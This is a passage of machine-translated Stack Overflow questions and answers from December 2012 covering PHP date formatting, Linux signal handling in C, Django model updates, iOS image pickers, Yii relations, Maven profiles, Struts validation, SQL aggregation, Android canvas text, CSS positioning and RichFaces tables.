现在我想区分日期，只打印日期 2012-12-26。如何仅通过 php.ini 打印日期。php 或 wordpress 中有任何内容只能从数据库中的元表中获取日期。请在代码中帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T10:32:10.403

尝试这个

```
 <?php $date=date('Y-m-d',strtotime('2012-12-26 10:00:40')); 
  echo $date
 ?> 
```

**或者**

```
<?php $date=date('Y-m-d',strtotime($time)); 
  echo $date
 ?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T10:33:03.303

这可以解决你的prb：

```
$date = new DateTime('2012-12-26 10:00:40');
echo $date->format('Y-m-d'); 
```

# linux - 未收到 SIGUSR1

> ID：14039277
> 
> 赞同：2
> 
> 时间：2012-12-26T10:29:09.293
> 
> 标签：linux, signals

这是我的第一个程序....ctrlcsignal.c

```
enter code here
#include<stdio.h>
#include<unistd.h>
#include<signal.h>

void signal_handler(int sigNo)
{
    //if Ctrl+c signal
if(sigNo==SIGINT){
    printf("value of SIGINT:-%d\t",SIGINT);
    printf("received SIGINT\n");
}

// if some other signal , but this part wont get executed
 // as the signal_handler function is registered with SIGINT only
else
{   
    printf("Some other signal found");
    printf("value of other signal:-%d",sigNo);
}

}

int main(void)
{
//registering the signal handler function with a signal
kill(19574,SIGUSR1);
if(signal(SIGINT,signal_handler)==SIG_ERR)
{   
    printf("\n can't catch SIGINT\n");
}

while(1)          //infinite loop
    sleep(1); // 1s ,so that the CPU is not busy 

    return 0;
 } 
```

这是我的第二个程序....userdefinedsignals.c

```
enter code here
#include <stdio.h>
#include <unistd.h>
#include <signal.h>

void signal_handler(int sigNo)
{

printf("function entered...");
// check for userdefined Signal SIGUSR1
 if (sigNo == SIGUSR1)
{
    printf("received SIGUSR1 with value :- %d",SIGUSR1);
}
//checking for KILL Signal
else if (sigNo == SIGKILL)
{
    printf("received SIGKILL with value :- %d",SIGKILL);
}
//checking for STOP Signal
else if (sigNo == SIGSTOP)
{
    printf("received SIGSTOP with value :- %d",SIGSTOP);
}
// if some other signal , but this part wont get executed
// as the signal_handler function is registered with SIGINT only
else
{
    printf("Some other signal found");
    printf("value of other signal:-%d",sigNo);
}

}

int main(void)
{

int pid_t;
printf("process id is %d",getpid());

//registering the signal handler function with a signal

if(signal(SIGUSR1,signal_handler) == SIG_ERR)
{
    printf("\n can't catch SIGSIGUSR1\n");
} 
if(signal(SIGKILL,signal_handler)==SIG_ERR)
{
    printf("\n can't catch SIGKILL\n");
}
 if(signal(SIGSTOP,signal_handler)==SIG_ERR)
{
    printf("\n can't catch SIGSTOP\n");
}

 while(1)          //infinite loop
    sleep(1); // 1s ,so that the CPU is not busy

return 0;
} 
```

我得到了第二个进程的 pid ...假设 xxxx 然后我使用以下命令... `enter code here` kill -USR1 xxxx

但它什么也没显示......然后我尝试通过在第一个程序中调用以下函数......但没有用...... `enter code here`kill（xxxx，SIGUSR1）;

帮我..！！！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-27T22:00:29.670

在这里工作。

```
#include <stdio.h>
#include <unistd.h>
#include <signal.h>

#include <stdarg.h> /* vsnprintf() */
#include <signal.h> /* signal */

void myprintf(FILE *fp, char *fmt, ...)
{
char buff[512];
int rc,fd;
va_list argh;
va_start (argh, fmt);

rc = vsnprintf(buff, sizeof buff, fmt, argh);
if (rc < 0  || rc >= sizeof buff) {
        rc = sprintf(buff, "Argh!: %d:\n", rc);
        }

if (!fp) fp = stderr;
fd = fileno(fp);
if (fd < 0) return;
if (rc > 0)  write(fd, buff, rc);
return;
}

void signal_handler(int sigNo)
{
switch (sigNo ) {
case SIGUSR1:
    myprintf(NULL, "received SIGUSR1 with value :- %d\n", SIGUSR1);
    break;
case SIGKILL:
    myprintf(NULL, "received SIGKILL with value :- %d\n", SIGKILL);
    break;
case SIGSTOP:
    myprintf(NULL, "received SIGSTOP with value :- %d\n", SIGSTOP);
    break;
default:
    myprintf(NULL, "Some other signal occured: %d\n", sigNo);
    break;
        }
return;
}

int main(void)
{
pid_t mypid;
mypid = getpid();
printf("process id is %d\n",  (int) mypid);

if(signal(SIGUSR1,signal_handler) == SIG_ERR)
        { printf("\n can't catch SIGSIGUSR1\n"); }
if(signal(SIGKILL,signal_handler)==SIG_ERR)
        { printf("\n can't catch SIGKILL\n"); }
if(signal(SIGSTOP,signal_handler)==SIG_ERR)
        { printf("\n can't catch SIGSTOP\n"); }
if(signal(SIGCONT,signal_handler)==SIG_ERR)
        { printf("\n can't catch SIGCONT\n"); }

while(1)  {
    sleep(1);
    }

return 0;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-27T21:06:13.220

您可以正常捕获信号，但没有看到消息，因为您没有正确终止行，并且系统上的标准输出流是行缓冲的（假设您的程序在终端中运行）。

标准 C 定义了输出流的三个缓冲级别：

*   无缓冲，输出立即传输
*   行缓冲，当遇到换行符时传输输出
*   完全缓冲，当内部缓冲区填满时传输输出

（这是一个简化 - 请参阅 C 参考或标准了解详细信息）。

考虑：

```
#include <stdio.h>
#include <unistd.h>

int main(void)
{
    printf("Hello");
    pause();
} 
```

这不会在终端中产生任何输出。通过终止该行来修复它：

```
printf("Hello\n"); 
```

这将在终端中产生预期的输出。

如果 stdout 没有连接到终端——例如，你重定向到一个文件——那么流将被完全缓冲。这个：

```
./a.out > foo 
```

`Ctrl-C`

```
cat foo 
```

即使添加了换行符，也不会产生任何输出。在这里，您需要显式刷新以在缓冲区满之前传输输出。

```
#include <stdio.h>
#include <unistd.h>

int main(void)
{
    printf("Hello\n");
    fflush(stdout);
    pause();
} 
```

即使重定向到文件，这也会产生输出。

# python - 模型保存仅更新特定字段

> ID：14039278
> 
> 赞同：1
> 
> 时间：2012-12-26T10:29:14.333
> 
> 标签：python, django, django-models

我正在尝试编写一个执行插入或更新的网络服务。请求是一个带有标题的帖子，值包含表名、列名和要为每列设置的值，我正在解析请求标题并形成一个参数 dict

```
def handel_request(request): if request.method == "POST":
        param_dict = formParmDict(request)
        ##if insert param_dict["Model"] is {'pk':1,'field1':100,'field2':200}
        ##if update param_dict["Model"] is {'pk':1,'field1':100}
        Model(**param_dict["Model"]).save() ## if update then sets field2 to null
        return HttpResponse()
    else:
        return HttpResponseBadRequest() 
```

这在`.save()`执行插入时工作正常。在更新的情况下，即如果`param_dict["Model"]`包含`{pk:1, field1:somevalue}`要更新，则它将除指定字段之外的其余字段设置`param_dict["Model"]`为空。这是为什么？难道我做错了什么？不保存假设只更新指定的字段吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T10:44:10.870

这**不是**你应该更新的方式。

```
Model(**param_dict["Model"]).save() 
```

您正在使用相同的`id`. 相反，您应该`get`实例化，然后适当地更新它。

```
m = Model.objects.get(id=param_dict['id'])
m.field = param_dict['some_field']
m.save() 
```

或者，您可以使用 Manager[更新](https://docs.djangoproject.com/en/dev/ref/models/querysets/#django.db.models.query.QuerySet.update)方法：

```
Model.objects.filter(id=param_dict['id']).update(**param_dict['Model']) 
```

如果您不确定记录是否已经存在，还有[get_or_create方法。](https://docs.djangoproject.com/en/dev/ref/models/querysets/#get-or-create)

您可以尝试使用 REST 框架，例如[taste-pie](http://django-tastypie.readthedocs.org/en/latest/)或[django-rest-framework](http://django-rest-framework.org/)，这可能会缓解您遇到的一些问题。

编辑：

关于如何在 django 中工作的[简要总结。](https://docs.djangoproject.com/en/dev/ref/models/instances/?from=olddocs#how-django-knows-to-update-vs-insert)`save`这就是我所说的是否发生`INSERT`或发生的意思`UPDATE`。除非您的`post_data`dict 包含所有字段的空值，否则请阅读有关如何`save`工作的文档，以更全面地了解 django 的工作原理。

所以，你的情况是这样的：

```
dict = {'id': 1, 'field1': 'my_value'}
m = Model(**dict)
m.id       # 1
m.field1   # my_value
m.field2   # None (because you haven't set it, it defaults to None
m.save()   # UPDATEs the existing instance with id 1 with ALL of the values of `m` 
```

因此，您正在保存一个包含`None`值的实例。这就是为什么我建议你做一个`get`，以便在保存到数据库之前填充所有正确的值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T13:52:38.247

也许你应该使用这样的一些功能：

```
def insert_or_update(param_dict):
    pk = param_dict.get('pk', None)
    if pk:
        Model.objects.filter(pk=pk).update(**param_dict)
    else:
        Model(**param_dict)
        Model.save() 
```

# iphone - 如何在 UIImagePickerController 上制作最近的图像？

> ID：14039279
> 
> 赞同：-1
> 
> 时间：2012-12-26T10:29:14.693
> 
> 标签：iphone, objective-c, ios, uiimagepickercontroller

在我的 iPhone 应用程序中，用户可以在上传时从设备中选择照片，当点击选择照片时 -`UIImagePickerController`来了。但是它的顺序是最近的照片在底部，所以用户必须滚动很多才能选择他们最近的照片，我怎样才能让它成为最近的照片在上面`UIImagePickerController`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T10:54:43.170

使用 UIImagePickerController 是不可能的。但是，您可以通过使用 ALAssetLibrary 并创建您的控制器来克服这个问题。

如果你的时间不够，我建议你使用[ELCImagePickerController](https://github.com/elc/ELCImagePickerController)，更改[ElcAssetTablePicker.m](https://github.com/elc/ELCImagePickerController/blob/master/Classes/ELCAssetTablePicker.m) **preparePhotos**方法的代码。

向其中添加以下代码

```
if(self.tableView.contentSize.height > self.tableView.frame.size.height)
{
    CGPoint offset = CGPointMake(0, self.tableView.contentSize.height - self.tableView.frame.size.height);
    [self.tableView setContentOffset:offset animated:NO];
} 
```

宾果游戏你会看到它会滚动到表格的底部。所以用户可以直接看到最近的照片。

如有任何疑问，请告诉我。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T10:53:37.473

你不能这样做。

没有办法调整`UIImagePickerController`.

如果您需要这个，您需要依赖任何第三方 api，或者您需要编写您的 on 选择器，该选择器使用它们的时间戳或资产 URL 对图像进行排序。（目前没有第三方库可用于执行此操作）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T10:27:24.397

我们可以在 imagepicker 中使用它

```
imagePicker.sourceType = UIImagePickerControllerSourceTypePhotoLibrary; 
```

# activerecord - Yii中如何禁止从相关模型中获取数据

> ID：14039291
> 
> 赞同：1
> 
> 时间：2012-12-26T10:29:56.213
> 
> 标签：activerecord, yii

我不需要从相关模型中获取数据。我有模特帖子我也有模特评论。

每个帖子都有评论。我在模型之间建立关联，所以：

```
class Post
    public function relations()
    {
        return array(
            'comments' => array(self::HAS_MANY, 'Comment', 'post_id')
        );
    }

    public function scopes()
    {
        return array(
            'orderDesc'=>array(
                'order' => 'post_id DESC',
            ),
        );

    }

    public function findAllPosts()
    {
        return $this->orderDesc()->findAll();
    } 
```

如果我从 db 收到帖子，我需要评论 - 没问题。

```
Post::model()->findByPk() 
```

但如果我得到所有帖子 - 我不需要评论

```
Post::model()->findAllPosts() 
```

但我收到带有评论的帖子。我认为 - 这对数据库不利 - 使用额外的连接，我很感兴趣如何禁用从相关模型获取数据。

我尝试通过场景来改变方法关系中的行为，但在方法关系中我总是 - $this->scenario 是空的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T11:05:41.253

在 Yii 中，定义的关系默认是延迟加载的。这意味着 Yii 只有当你在代码中调用它们时才会获取相关模型。

所以如果你这样做

```
Post::model()->findAll(); 
```

不会加载相关模型（即：评论）。但如果你的电话

```
Post::model()->findAll();
CVarDumper::dump($posts[0]->comments); 
```

然后将执行第二个数据库请求以获取相关评论。这就是代码显示注释的原因。

如果您知道您将需要一个相关模型，最好的解决方案是使用预加载：它包括在加载初始模型的同一请求中加载相关模型。为此，您需要`with`在代码中指定方法。

例子：

```
Post::model()->with('comments')->findAll(); 
```

此方法`with`也可以放在模型中定义的范围内或默认范围内。如果它在默认范围内，那么每次加载模型时，他的相关模型都会在同一个请求中加载。

最后一点：

当您使用急切加载时，会执行一个请求来获取相关模型，但这种技术并不适用于每个关系。

例如，如果你有一个`post`并且你想加载`author`配置文件，因为只有一个`author`，请求会很快，只返回一行，所以急切加载是好的。

但是你想加载`comments`. 由于它只执行一个请求，因此您将有几行包含许多类似信息（关于 的所有信息`post`）。在这种情况下，纯粹的急切加载并不是最好的解决方案。处理这些关系的最佳方法是在关系数组中将参数指定`together`为 false。如果这样做，将执行 2 个请求：第一个请求获取 the `post`，第二个请求获取相关的`comments`.

例子：

```
Post::model()->with('comments' => array('together' => false))->findAll(); 
```

来源：[Yii 指南](http://www.yiiframework.com/doc/guide/1.1/en/database.arr)

# java - 马文。如何从 paren pom.xml 继承配置文件？

> ID：14039292
> 
> 赞同：0
> 
> 时间：2012-12-26T10:29:59.087
> 
> 标签：java, maven

我的父母有 2 个配置文件`pom.xml`（用于生产和开发）。所以我想在我的子模块中继承这个配置文件......我怎么能做到这一点？我如何继承父母的个人资料？或者我需要在子模块中指定具有相同 ID 的配置文件并且一切正常？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-26T10:37:01.160

您需要在您的子 pom.xml 文件中提供以下内容以从您的父级继承，这意味着继承您在父级中定义的所有配置文件：

```
 <project ..>
      <modelVersion>4.0.0</modelVersion>

      <parent>
        <groupId>TheGroupIdYourParentHas</groupId>
        <artifactId>TheArtifactIdYourParentHas</artifactId>
        <version>1.0.0</version>
      </parent>
      ...
   </project> 
```

顺便提一句。您应该考虑使用配置文件来[区分生产和开发](http://java.dzone.com/articles/maven-profile-best-practices)。通常你应该简单地打电话

```
mvn package 
```

在不使用任何配置文件的情况下生产用于生产的正确包装。我写了[一篇博客文章来更好地处理这些事情](http://blog.soebes.de/index.php?/archives/340-Maven-Configuration-For-Multipe-Environments.html)。

# struts - 验证失败时转发对 Action 类的调用

> ID：14039299
> 
> 赞同：0
> 
> 时间：2012-12-26T10:30:29.900
> 
> 标签：struts, struts-validation

我正在开发 struts 1.1 应用程序。
我已经为 JSP 表单页面（即 adduser.jsp）添加了验证。
单击添加按钮后，它会得到验证。我在“Validator-XSS.xml”中的验证工作正常。
但是当验证失败时，它会转发到输入属性，即 jsp 表单页面（即 adduser.jsp）。
在这里，我需要将调用转发到另一个
打开 JSP 表单页面（即 adduser.jsp）的操作（ieopenAddUser.do）。

**更新**

struts-config.xml

```
 <struts-config>
    <!-- some another entries -->

    <form-bean name="UserForm" type="com.UserForm"/>

    <action path="/createuser" type="com.CreateUserAction" name="UserForm" 
    scope="request"> 
            <forward name="adduser" path="/jsp/adduser.jsp"/> 
    </action>

    <action path="/adduser" type="com.AddUserAction" input="/jsp/adduser.jsp" 
name="UserForm" scope="request"> 
            <forward name="showuser" path="/showUserDetails.do"/>
    </action>

    <plug-in className="org.apache.struts.validator.ValidatorPlugIn">
        <set-property
            property="pathnames"
            value="/WEB-INF/User-Validator.xml"/>
    </plug-in>
    </struts-config> 
```

XSS-validator.xml

```
<form-validation>
<formset>
    <form name="UserForm">

        <field property="userName" depends="mask">
<msg name="mask" key="ui.field.invalidvalue" bundle="appResources"/>                
            <var>
                <var-name>mask</var-name>
                <var-value>^[a-zA-Z0-9-_]*$</var-value>
            </var>
        </field>

    </form>
</formset> 
```

单击在 jsp 文件中创建用户时，它将调用**createuser.do**在表单中输入详细信息后将打开 adduser.jsp，然后单击添加按钮，它将**adduser.do** 也通过 XSS-validator.xml 进行验证，但调用转到**jsp /adduser.jsp**但我需要它必须调用**createuser.do**

```
ActionForm is extended by ValidatorForm

public class UserForm extends ValidatorForm{

    String userName;
    String userId;

    //getter setter
    }

ActionClass

Public Class CreateUserAction{
    public ActionForward execute(ActionMapping mapping,ActionForm form,HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {

    //some code to bring list and other details

    mapping.findForward("adduser");
    }

    Public Class AddUserAction{
    public ActionForward execute(ActionMapping mapping,ActionForm form,HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {

   //some code to add user and other details

    mapping.findForward("showuser");
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-18T05:08:42.577

那是因为您没有使用路径调用该操作。尝试使用这种方式调用该方法，该方法将起作用并解决您的问题。

调用方法和动作

这将相应地工作。调用该操作。

# sql - SQL将选择以防万一

> ID：14039305
> 
> 赞同：1
> 
> 时间：2012-12-26T10:30:56.170
> 
> 标签：sql, select

我有 3 个表 Emp、Payroll_Emp 和 tbCompany，Emp 和 tbCompany 之间没有关系

我做了那个查询，但是我为所有员工得到了相同的 CeilingEOS 我需要为每个员工求和的 CeilingEOS 我知道我必须将 SUM(CeilingEOS) 放在选择中，但它也不起作用，有人可以帮我吗

```
DECLARE @CeilingEOS decimal(18,2)

SET  @CeilingEOS=(select SUM (CeilingEOS)  FROM Payroll_Emp inner join emp on Payroll_Emp.Employee_Id = Emp.[ID] where @Date>=Payroll_Emp.Payroll_From)

select Emp.ID, tbCompany.ID, tbCompany.CompanyName, tbCompany.CEmpRepDesc, 
Emp.SSN, 

--case  when Payroll_Emp.CeilingEOS IS NOT NULL then select SUM(CeilingEOS) as ceilingEOS
from Payroll_Emp where Payroll_Emp.Employee_Id = Emp.[ID] group by Emp.ID end

FROM  tbCompany, Emp -- inner join Payroll_Emp on Payroll_Emp.Employee_Id = Emp.[ID]  
where @Date >= Emp.HireSince and Emp.ID=Emp.[ID] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T10:41:33.383

你可以试试这个：

```
DECLARE 
    @CompanyID uniqueidentifier, 
    @CompanyName nvarchar(max), 
    @CEmpRepDesc nvarchar(max)

select top 1 @CompanyID = tbCompany.ID, @CompanyName= tbCompany.CompanyName, @CEmpRepDesc = tbCompany.CEmpRepDesc from tbCompany

select Emp.ID, Emp.SSN, ComputedInfos.CeilingEOS, @CompanyID, @CompanyName, @CEmpRepDesc
from Emp 
left join (select Emp.ID as EmpID, SUM(CeilingEOS) as CeilingEOS from Emp join Payroll_Emp on Payroll_Emp.Employee_Id = Emp.[ID] where @Date >= Emp.HireSince group by Emp.ID) ComputedInfos 
    on ComputedInfos.EmpID = Emp.ID
where @Date >= Emp.HireSince 
```

# android - 在包含 Canvas 的布局中心设置文本

> ID：14039309
> 
> 赞同：0
> 
> 时间：2012-12-26T10:31:29.593
> 
> 标签：android, android-canvas

我有如下情况

![在此处输入图像描述](../Images/fe08ed937f76bdc79f33e4e4e7f4ddff.png)

在我的线性布局中，我添加了一个包含画布的视图（MyView）

```
drawLayout.addView(new MyView(this,"a")); 
```

现在我想**在线性布局中间的**画布中绘制一个文本，为此我计算线性布局的高度和宽度（drawWidth，drawHeight）然后写这个，

```
canvas.drawText(letterTOdraw,drawWidth/2,drawHeight/2,mpaint); 
```

但它没有正确绘制（不在中心）。之后我修改如下

```
canvas.drawText(letterTOdraw,canvas.getWidth()/2,canvas.getHeight()/2,mpaint); 
```

但什么都没有改变。当我计算画布高度和宽度时，我很惊讶我给了我 600 X 1024 ，我怎么可能将 MyView 设置为只有 951X359 的线性布局。

因此我无法在线性布局的中心绘制文本。

我在过去 5 小时内都陷入了这个问题。帮助我摆脱困境。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T10:36:07.103

您的居中代码错误。您的代码将不会在中心绘制文本，而是稍微向底部和右侧绘制文本 - 画布的中心将是文本的左上角。

如果要在中心绘制文本，则需要考虑文本的大小 - 在`((canvas.getWidth() - letterWidth) /2, (canvas.getHeight() - letterHeight) / 2))`

# javascript - 我如何重新定位固定的页眉和页脚？

> ID：14039317
> 
> 赞同：0
> 
> 时间：2012-12-26T10:32:34.427
> 
> 标签：javascript, ios, css, cordova, jquery-mobile

我在使用固定页眉和页脚时遇到了一些问题，但是有人建议我使用 Position: Absolute 而不是 Fixed 并在使用 JavaScript 代码滚动时重新定位页眉和页脚，有人知道该怎么做吗？或者这个问题摆在他面前。

任何建议都会有所帮助。

最好的祝福。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:37:32.317

看看下面的代码是否有帮助（注意边距调整如何使用负值，即被定位的 div 大小的一半）：

```
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>align</title>
<style type="text/css">
body {
    margin: 0px;
    padding: 0px;
}
#text_center {
    text-align: center;
    width: 200px;
    position:absolute;
    left:50%;
    top:50%;
    margin-left:-100px;
    margin-top:-20px;
}
#text_bottom {
    text-align: center;
    width: 200px;
    position:absolute;
    left:50%;
    bottom:1%;
    margin-left:-100px;
}
</style>
</head>
<body>
    <div id="text_center">Text 1</div>
    <div id="text_bottom">Text 2</div>
</body>
</html> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T11:32:41.380

艾哈迈德，我刚从我们讨论过的另一个话题来到这里。你的问题不够清楚，其他人无法回答。您的问题应该包括您需要触发 javascript 函数以重新定位特定事件的事实。

您可以这样做的一种方法是：将元素更改为绝对位置而不是固定位置。根本不要使用固定的。然后在每次浏览器窗口滚动或完成滚动时触发定位元素的 javacript 函数。通过这样做，元素将始终在用户完成滚动后移动到视图中。它们实际上会突然出现，看起来很难看。为了使它们顺利进入视野，您必须通过使用 css3 转换或使用 javascript 逐渐插入位置来进一步扩展它。在 iOS5 和 iOS6 上，你应该能够很好地使用 css3 过渡。它们很容易实现。CSS3 过渡使 javascript 控制的动画变得轻而易举。

The hard part will be implementing the javascript to compute the element positions and then fire the event after the browser finishes scrolling.

Hopefully some other folks can chime in if I've got the right direction.

Vote me up, bro. :)

# php - 包含键和关联数组的数组，如何建立关系

> ID：14039318
> 
> 赞同：0
> 
> 时间：2012-12-26T10:32:48.263
> 
> 标签：php, arrays, key, associative-array

我有一个数组，其中包含`path`来自另一个数组的特定值，为了让它更清楚一点，这里是一个例子。

我的数组包含我将调用 $params 的键

```
Array
(
    [0] => paths
    [1] => assets
    [2] => js
) 
```

这是我的关联数组，我将其称为 $config

```
Array
(
    [paths] => Array
        (
            [assets] => Array
                (
                    [js] => /assets/js
                    [css] => /assets/css
                )

        )

    [library] => Array
        (
            [js] => jQuery
        )

) 
```

那么如何使用数组 1 访问数组 2 中的值呢？

我试过`$config[$params[0]][$params[1]][$params[2]]`了，但它根本没有效率。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T10:42:29.343

你可以试试

```
$path = array(
        0 => 'paths',
        1 => 'assets',
        2 => 'js',
);

$data = array(
  'paths' => array(
    'assets' => array(
      'js' => '/assets/js',
      'css' => '/assets/css',
    ),
  ),
  'library' => array(
    'js' => 'jQuery',
  ),
);

$temp = $data;
foreach($path as $key) {
    $temp = $temp[$key];
}

var_dump($temp); 
```

输出

```
string '/assets/js' (length=10) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-26T10:46:53.283

循环应该可以解决您的问题：

```
$c = $config;
foreach($params as $path) {
  if(!array_key_exists($path, $c)) {
    $c = null;
    break;
  }
  $c = $c[$path];
} 
```

这将遍历每个条目，`$params`然后访问`$config`数组的子键。找到后，`$c`将包含当前子数组。最后，`$c`将包含您要查找的值（`NULL`如果路径无效/未找到）。

同样可以使用`array_reduce`函数以函数方式完成：

```
$path = array_reduce(function($current, $path) {
  if($current == NULL || !array_key_exists($path, $current))
    return NULL;

  return $current[$path];
}, $params, $config); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-26T10:46:01.367

嗨，乔纳森，你最后错过了一个大括号，试试这个“$config[$params[0]][$params[1]][$params[2]]”。它会起作用我发布了一个对我来说很好的代码

```
<?php
$params = array(0 => 'paths',1 => 'assets',2 => 'js');
echo '<pre>';print_r($params);

$config = array
(
    'paths' => array
        (
            'assets' => array
                (
                    'js' => '/assets/js',
                    'css' => '/assets/css'
                )

        ),

    'library' => array
        (
            'js' => 'jQuery'
        )

);
echo '<pre>';print_r($config);
echo $config[$params[0]][$params[1]][$params[2]];
 ?> 
```

# php - 如何覆盖 [mysite]/concrete5/core 中的文件

> ID：14039319
> 
> 赞同：1
> 
> 时间：2012-12-26T10:32:48.323
> 
> 标签：php, concrete5

我想覆盖留言簿功能。确切地说，我想覆盖*[mysite]/concrete5/core/controllers/blocks/guestbook.php*`action_form_save_entry()`上的函数

 *我试图通过以下方式覆盖它：

*   [我的网站]/controllers/blocks/guestbook.php
*   [我的网站]/core/controllers/blocks/guestbook.php

他们都没有工作。我找不到任何方法来覆盖该文件。[此处](http://www.concrete5.org/documentation/introduction/overrides)和[此处](http://www.concrete5.org/documentation/how-tos/developers/change-things-without-hurting-anything-overrides/)的文档未显示如何覆盖该`/core/`目录。他们的论坛从来没有帮助。谷歌结果也只是被“核心”关键字误导。所有结果都只是将“核心”含义视为`/concrete5/`目录中存在的内容，而不是完全正确的`/concrete5/core`

看起来 /concrete5/core/ 目录只出现在较新的版本上。CMIIW。

顺便说一句，也许我还应该告诉你我想用那个函数做什么。可能您对此有另一种解决方法，而不是简单地覆盖它。我想向它添加短信通知功能。因此，每当有人提交新评论时，都会向特定页面的管理员发送一条短信。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-29T09:44:47.687

是的，/concrete/core 目录结构是 5.6 的新内容。c5 上的教程和文档可能......缺乏......但在这种情况下，这只是他们落后一点的问题。

“真正的”留言簿控制器位于*/concrete/blocks/guestbook/controller.php*。你会注意到它只是一个类的外壳：

```
class GuestbookBlockController extends Concrete5_Controller_Block_Guestbook {} 
```

您引用的文件定义`Concrete5_Controller_Block_Guestbook`.

因此，解决方案是覆盖真正的控制器，而不是它扩展的任何内容（即，您正在查看的文件）。这样想，应该更清楚需要在*/blocks/guestbook/controller.php*创建一个文件。事实上，只需**复制我**上面引用的 controller.php，因为您需要保留（有时是多个）类。然后，您可以覆盖特定功能。（不要忘记调用 parent::action_save_form_entry()）。*

# jsf - 丰富的数据表更新问题

> ID：14039321
> 
> 赞同：2
> 
> 时间：2012-12-26T10:32:59.123
> 
> 标签：jsf, datatable, richfaces

我对丰富的dataTable有问题实际上我从数据库中填充了dataTable并通过在其中放置一个inplaceInput使列可编辑问题是当我提交给支持bean时值不会改变支持bean填充了旧的最初填充 dataTable 的值：这是我的表的 JSF 代码：

```
<center>
        <fieldset><rich:dataTable id="tablefiles"
            value="#{fileBean.files}" var="file" rows="8"
            iterationStatusVar="it">

            <rich:column id="Child_Code">
                <f:facet name="header">
                    <h:outputText value="N°tiers filiale" />
                </f:facet>
                <h:outputText value="#{file.child_Code}" />
            </rich:column>

            <rich:column id="Mother_Code">
                <f:facet name="header">
                    <h:outputText value="Nom du groupe" />
                </f:facet>
                <!--  <h:inputText value="#{file.mother_Code}" />-->
                <rich:inplaceInput defaultLabel="Click here to edit"
                    showControls="false" controlsHorizontalPosition="left"
                    controlsVerticalPosition="bottom" id="inplaceInput"
                    value="#{file.mother_Code}"
                    >
                </rich:inplaceInput>
            </rich:column>

            <rich:column>
                <f:facet name="header" roles="#riskuser">
                    <h:outputText value="Détail" />
                </f:facet>
                <h:commandLink action="#{fileBean.accesDetail}">
                    <h:graphicImage value="/images/edit.png" alt="edit"
                        style="border:0;" title="Détail " />
                    <f:setPropertyActionListener target="#{fileBean.selectedFile}"
                        value="#{file}" />
                </h:commandLink>
            </rich:column>

            <f:facet name="footer">
                <rich:dataScroller page="#{fileBean.page}" />
            </f:facet>
        </rich:dataTable> <br />

        <h:panelGrid columns="3" id="buttonRow">

            <a4j:commandButton value="Save" render="tablefiles" execute="@form"
                action="#{fileBean.update}">

            </a4j:commandButton>

        </h:panelGrid></fieldset>
        </center>`<center>
        <fieldset><rich:dataTable id="tablefiles"
            value="#{fileBean.files}" var="file" rows="8"
            iterationStatusVar="it">

            <rich:column id="Child_Code">
                <f:facet name="header">
                    <h:outputText value="N°tiers filiale" />
                </f:facet>
                <h:outputText value="#{file.child_Code}" />
            </rich:column>

            <rich:column id="Mother_Code">
                <f:facet name="header">
                    <h:outputText value="Nom du groupe" />
                </f:facet>
                <!--  <h:inputText value="#{file.mother_Code}" />-->
                <rich:inplaceInput defaultLabel="Click here to edit"
                    showControls="false" controlsHorizontalPosition="left"
                    controlsVerticalPosition="bottom" id="inplaceInput"
                    value="#{file.mother_Code}"
                    >
                </rich:inplaceInput>
            </rich:column>

            <rich:column>
                <f:facet name="header" roles="#riskuser">
                    <h:outputText value="Détail" />
                </f:facet>
                <h:commandLink action="#{fileBean.accesDetail}">
                    <h:graphicImage value="/images/edit.png" alt="edit"
                        style="border:0;" title="Détail " />
                    <f:setPropertyActionListener target="#{fileBean.selectedFile}"
                        value="#{file}" />
                </h:commandLink>
            </rich:column>

            <f:facet name="footer">
                <rich:dataScroller page="#{fileBean.page}" />
            </f:facet>
        </rich:dataTable> <br />

        <h:panelGrid columns="3" id="buttonRow">

            <a4j:commandButton value="Save" render="tablefiles" execute="@form"
                action="#{fileBean.update}">

            </a4j:commandButton>

        </h:panelGrid></fieldset>
        </center> 
```

这是我的 bean 代码：

```
 package ui.bean;

import java.io.Serializable;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import javax.faces.bean.ManagedBean;
import javax.faces.bean.SessionScoped;

import business.ISRGGestionGarantieCasa;

import common.pojo.SRGarantieCasa;

@ManagedBean
@SessionScoped
public class GarantiCasaBean implements Serializable {

private static final long serialVersionUID = -1509108399715814312L;
private ISRGGestionGarantieCasa fileService;
private int idMsg;
private int page = 1;
private String id_r;
private List<SRGarantieCasa> files = new ArrayList<SRGarantieCasa>();
private SRGarantieCasa selectedFile, file;
private List<String> suggestions = null;

public List<String> getSuggestions() {
    return suggestions;
}

public void setSuggestions(List<String> suggestions) {

    this.suggestions = suggestions;
}

public SRGarantieCasa getSelectedFile() {
    return selectedFile;
}

public void setSelectedFile(SRGarantieCasa selectedfile) {
    this.selectedFile = selectedfile;
}

public ISRGGestionGarantieCasa getFileService() {
    return fileService;
}

public void setFileService(ISRGGestionGarantieCasa fileService) {
    this.fileService = fileService;
}

public int getIdMsg() {
    return idMsg;
}

public void setIdMsg(int idMsg) {
    this.idMsg = idMsg;
}

public int getPage() {

